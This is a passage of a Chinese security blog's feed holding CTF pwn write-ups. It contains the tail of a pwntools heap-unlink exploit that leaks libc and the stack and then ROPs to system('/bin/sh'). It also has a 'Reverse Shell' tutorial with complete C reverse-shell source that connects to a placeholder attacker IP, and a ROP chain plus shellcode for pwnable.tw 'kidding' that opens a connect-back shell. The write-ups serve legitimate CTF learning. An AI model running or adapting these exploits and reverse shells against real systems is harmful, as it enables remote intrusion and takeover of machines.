punctuation">(</span><span class="token number">0x7ffff7ffe3b0</span><span class="token operator">-</span><span class="token number">0x00007ffff7ffbe50</span><span class="token punctuation">)</span>fake_list_addr <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7ffe480</span><span class="token operator">-</span><span class="token number">0x7ffff7ffe3b0</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"heap addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>fake_list <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span> <span class="token comment" spellcheck="true"># 0,1,2  由于unlink的缘故，这里会发生一些变化，为了后面数据不乱，前面填充垃圾数据</span>fake_list<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x602034</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3   判断show的bss段上的数据 </span>fake_list<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601FB8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4 read got addr</span>fake_list<span class="token operator">+=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_list_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token comment" spellcheck="true"># 5 为了继续修改fake_heap_list，所以将其地址写入list中</span>fake_list<span class="token operator">+=</span> <span class="token string">"\n"</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>fake_list<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># unlink</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x602040</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_list_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0x602040是存放heap_list的地址</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span>overflow<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak stack</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>fake_list <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x602034</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>fake_list<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__environ"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>fake_list<span class="token operator">+=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_list_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>fake_list<span class="token operator">+=</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>fake_list<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>p_rdi_r <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0000000000014862</span>p_rsi_r <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x000000000001c237</span>p_rsp_r <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0000000000004628</span>bin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>p_rdi_r<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>ret_addr <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7fffffffdd08</span><span class="token operator">-</span> <span class="token number">0x00007fffffffdd78</span><span class="token punctuation">)</span>fake_list <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x602034</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>fake_list<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__environ"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>fake_list<span class="token operator">+=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>fake_list<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>rop<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
            <tag> tcache smashing unlink </tag>
            
            <tag> rop </tag>
            
            <tag> 从dump文件复原二进制文件 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse Shell</title>
      <link href="/2020/09/15/reverse-shell/"/>
      <url>/2020/09/15/reverse-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>之前一直没了解反弹shell的真正含义，今天刚好发现自己pwnable的排名有点瓦，做道题冲个分吧…这篇文章参考了m4x师傅的文章，总结下来供自己学习：</p><h1 id="0x02-shell是什么"><a href="#0x02-shell是什么" class="headerlink" title="0x02 shell是什么"></a>0x02 shell是什么</h1><p>简单的来说shell就是用户操作系统的入口，通过shell去调用其它的应用程序。例如：我们执行cat flag这条命令，那么去调用open、read、write等系统调用，虽然shell并没有跟内核直接进行交互，但是也可以认为shell为用户和内核提供了交互界面。</p><h1 id="0x03-文件描述符"><a href="#0x03-文件描述符" class="headerlink" title="0x03 文件描述符"></a>0x03 文件描述符</h1><p>当进程打开现有文件或创建新文件 (open) 时，内核向进程返回一个 文件描述符（file descriptor）。在形式上是一个非负整数，作为一个索引指向被打开的文件，所有执行 I/O 操作的系统调用都会通过文件描述符。</p><h1 id="0x04-stdin-stdout-和-stderr"><a href="#0x04-stdin-stdout-和-stderr" class="headerlink" title="0x04 stdin, stdout 和 stderr"></a>0x04 stdin, stdout 和 stderr</h1><p>0，1 和 2 文件描述符分别代表 stdin，stdout 和 stderr。每个程序在运行时会自动打开三个文件 stdin，stdout 和 stderr，文件描述符为0,1,2，分别代表标准输入，标准输出和标准错误；之后打开的文件会从 3 继续向后递增，新打开文件 (open) 时，将返回所能允许的最小文件描述符。</p><p>例子</p><pre class="line-numbers language-c"><code class="language-c"> <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"dumb output because stdout is closed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_CREAT<span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Since open() returns 1 and puts() triggers write(1,....), this message wi       │ ll be written to the file output.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// don't forget to close(fd)!!!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4行的输出并没有向往常一样显示在显示屏上，因为 stdout 在 1行已经被关闭了；4行的信息输出到了 output.txt 中，这是因为3行执行时，这个进程有 0 和 2 两个 fd，因此 open 返回所能允许的最小文件描述符 1，而 puts 实际是系统调用 write(1, ….)，因此这条消息就被写到了 1 （此时为打开的 output.txt）这个文件中；同理，我们还可以通过 close(0)，close(1) 等操作控制进程从其他文件（包括其他进程，socket，pipe 等）进行 io。</p><h1 id="0x05-reverse-shell"><a href="#0x05-reverse-shell" class="headerlink" title="0x05 reverse shell"></a>0x05 reverse shell</h1><p><strong>由于题目关闭了标准输入、标准输出和错误输出流，就算我们get shell也没办法继续”cat flag”，在get shell之前我们监听某个端口，想办法让服务器端主动和我们客户端在这个端口建立一个连接，并将输入输出流转到这个端口上。</strong></p><p>往 /proc/self/mem 写数据更改 binary 内容。通过 vmmap 可以看出 0x400000 - 0x401000 段具有可以行权限，且地址是固定的，因此我们可以控制 open(“/proc/self/mem”, 2) 返回的 fd 为 1，然后通过 puts(shellcode) 既可以将 shellcode 写到这段地址上，再控制 rip 到 shellcode 就可以建立一个 reverse shell。</p><p>大体思路如下：</p><ol><li>利用 open(“/proc/self/fd/0”, 0) 来构造 ropchain，ropchain 实现 open(“/proc/self/mem”, 2) 返回的 fd 为 </li><li>通过 puts(shellcode) 将 shellcode 写到具有可执行权限的代码段，可以用 lseek 控制 puts 写的位置</li><li>控制 rip 为 shellcode 建立 reverse shell</li><li>可以使用 /dev/stdin 代替 /proc/self/fd/0，效果一样，可以给 shellcode 留下更多空间</li></ol><h1 id="0x06-reverse-shell经典建立方式"><a href="#0x06-reverse-shell经典建立方式" class="headerlink" title="0x06 reverse shell经典建立方式"></a>0x06 reverse shell经典建立方式</h1><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span>   │ <span class="token comment" spellcheck="true">// reverse shell</span><span class="token number">2</span>   │ #include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>types<span class="token punctuation">.</span>h<span class="token operator">></span>   <span class="token number">3</span>   │ #include <span class="token operator">&lt;</span>sys<span class="token operator">/</span>socket<span class="token punctuation">.</span>h<span class="token operator">></span>   <span class="token number">4</span>   │ #include <span class="token operator">&lt;</span>netinet<span class="token operator">/</span>in<span class="token punctuation">.</span>h<span class="token operator">></span>   <span class="token number">5</span>   │ <span class="token number">6</span>   │ #define <span class="token constant">NULL</span> <span class="token number">0</span><span class="token number">7</span>   │ <span class="token number">8</span>   │ <span class="token keyword">int</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token keyword">int</span> domain<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocal<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">9</span>   │ <span class="token keyword">int</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> sockaddr <span class="token operator">*</span>addr<span class="token punctuation">,</span> socklen_t addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">10</span>   │ <span class="token keyword">int</span> <span class="token function">dup2</span><span class="token punctuation">(</span><span class="token keyword">int</span> oldfd<span class="token punctuation">,</span> <span class="token keyword">int</span> newfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">11</span>   │ <span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">12</span>   │ <span class="token keyword">int</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">13</span>   │ <span class="token number">14</span>   │ <span class="token keyword">void</span> <span class="token function">reverse_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">15</span>   │ <span class="token punctuation">{</span><span class="token number">16</span>   │        <span class="token keyword">char</span><span class="token operator">*</span> address <span class="token operator">=</span> <span class="token string">"your_ip"</span><span class="token punctuation">;</span><span class="token number">17</span>   │        <span class="token keyword">int</span> port <span class="token operator">=</span> your_port<span class="token punctuation">;</span><span class="token number">18</span>   │ <span class="token number">19</span>   │        <span class="token comment" spellcheck="true">// create a new socket but it has no address assigned yet</span><span class="token number">20</span>   │        <span class="token keyword">int</span> sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token comment" spellcheck="true">/* 2 */</span><span class="token punctuation">,</span> SOCK_STREAM<span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">21</span>   │ <span class="token number">22</span>   │        <span class="token comment" spellcheck="true">// create sockaddr_in structure for use with connect function</span><span class="token number">23</span>   │        <span class="token keyword">struct</span> sockaddr_in sock_in<span class="token punctuation">;</span><span class="token number">24</span>   │        sock_in<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span><span class="token number">25</span>   │        sock_in<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>   │        sock_in<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">27</span>   │ <span class="token number">28</span>   │        <span class="token comment" spellcheck="true">// perform connect to target IP address and port</span><span class="token number">29</span>   │        <span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sock_in<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr_in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">30</span>   │ <span class="token number">31</span>   │        <span class="token comment" spellcheck="true">// duplicate file descriptors for STDIN/STDOUT/STDERR</span><span class="token number">32</span>   │        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span><span class="token number">33</span>   │        <span class="token punctuation">{</span><span class="token number">34</span>   │                <span class="token function">dup2</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">35</span>   │        <span class="token punctuation">}</span><span class="token number">36</span>   │ <span class="token number">37</span>   │        <span class="token comment" spellcheck="true">// execve("/bin/sh", 0, 0)</span><span class="token number">38</span>   │        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">39</span>   │ <span class="token number">40</span>   │        <span class="token function">close</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">41</span>   │ <span class="token number">42</span>   │        <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token number">43</span>   │ <span class="token punctuation">}</span><span class="token number">44</span>   │ <span class="token number">45</span>   │ <span class="token number">46</span>   │ <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">47</span>   │ <span class="token punctuation">{</span><span class="token number">48</span>   │        <span class="token function">reverse_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">49</span>   │ <span class="token number">50</span>   │        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token number">51</span>   │ <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>建立一个 socket，此时会新建一个 fd</li><li>给这个 socket 分配 ip 和 port</li><li>通过 dup2，将 socket 的 fd 复制到 0，1 和 2 上，这样 shell 的 io 就完全通过建立的 socket 了，这时如果我们监听这个 ip 和 port，就相当于拿到了一个 shell</li></ol><h1 id="0x07-例题"><a href="#0x07-例题" class="headerlink" title="0x07 例题"></a>0x07 例题</h1><h2 id="pwnable-kidding"><a href="#pwnable-kidding" class="headerlink" title="pwnable kidding"></a>pwnable kidding</h2><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/15/reverse-shell/0.png"></div>PIE、Canary没开、Got表可劫持<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/15/reverse-shell/1.png"></div>可以看到是一个简单的栈溢出漏洞，但是在getshell之前已经关闭了输入输出流了，那也就是说我们后续想要执行命令已经无法通过shell来与系统交互。<p>根据上面所学，我们的目标应该是通过执行代码来得到一个shell，但是我们看到题目NX开启，那么我们看看有没有什么办法可以关闭NX</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/15/reverse-shell/2.png"></div><p>我们看到这里有个函数，将栈地址设置可执行，那么就很简单了：</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>通过rop+shellcode，反弹shell。</p><p>出了反弹shell没有什么太多特别的东西，注意需要改一下hook函数的偏移，为了少压一个参数到栈中，令其执行完函数后可以返回到我们写入栈中的返回地址，具体调一下就知道了。从汇编层面上慢慢解决问题即可：</p><p>rop部分</p><pre class="line-numbers language-python"><code class="language-python">pop_eax_ret <span class="token operator">=</span> <span class="token number">0x80e2318</span> <span class="token comment" spellcheck="true"># pop eax; ret</span>pop_ecx_ret <span class="token operator">=</span> <span class="token number">0x080583c9</span> <span class="token comment" spellcheck="true"># pop exc; ret</span>inc_mem <span class="token operator">=</span> <span class="token number">0x080842c8</span> <span class="token comment" spellcheck="true">#inc dword ptr [ecx]; ret</span>jmp_esp <span class="token operator">=</span> <span class="token number">0x80ddd07</span>rop <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x8048902</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#__libc_stack_end-0x18</span><span class="token comment" spellcheck="true"># rop += p32(pop_eax_ret) + p32(0x80e9fc8)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ecx_ret<span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"_dl_make_stack_executable_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>inc_mem<span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x80937F0</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x80ddd07</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>shellcode部分：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># socket(AF_INET/* 2 */, SOCK_STREAM/* 1 */, 0);</span>payload <span class="token operator">=</span> <span class="token string">"push 0x1;pop ebx;cdq;"</span>payload<span class="token operator">+=</span> <span class="token string">"mov al,0x66;push edx;push ebx;push 0x2;mov ecx,esp;int 0x80;"</span><span class="token comment" spellcheck="true"># dup2(oldfd,newfd) eax = 0x3f, ebx = oldfd,ecx = newfd dup2(0,1)</span>payload<span class="token operator">+=</span> <span class="token string">"pop esi;pop ecx;xchg ebx,eax;mov al,0x3f;int 0x80;"</span><span class="token comment" spellcheck="true"># ##socketcall() eax=0x66,ebx=3,sys_connect(0,ip_port,0x10)</span>payload<span class="token operator">+=</span> <span class="token string">"mov al,0x66;push %d;push ax;push si;mov ecx,esp;"</span> <span class="token operator">%</span> ippayload<span class="token operator">+=</span> <span class="token string">"push 0x10;push ecx;push ebx;mov ecx,esp;mov bl,0x3;int 0x80;"</span><span class="token comment" spellcheck="true"># execute("/bin/sh")</span>payload<span class="token operator">+=</span> <span class="token string">"mov al,0xb;pop ecx;push 0x68732f;push 0x6e69622f;mov ebx,esp;int 0x80;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不知道为什么打不通远程，由于tw的高分题暂时就不放完整exp了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 补充知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 第五空间安全大赛</title>
      <link href="/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/"/>
      <url>/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/0.png"></div>PIE没开、RELRO没开.栈迁移<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/1.png"></div>程序很简单，就是循环两次来进行输入，再打印出来。输入的地方有栈溢出，第一次只能溢出1个byte，第二次可以溢出0x18个byte。<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>第一步：利用溢出一个字节来泄露出canary和stack<br>第二步：利用第二次溢出来leave到迁移到上面输入的栈中，栈中提前布置好rop一个目的是泄露libc，还有一个目的是返回到start地址（pop rdi + elf.got[‘got’]+efl.got[‘plt’]+start_addr）<br>第三步：利用第二次程序执行的第二次溢出，leave迁移到栈中，提前准备gadget来getshell(pop rdi + binsh_addr + system_addr)</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/2.png"></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code 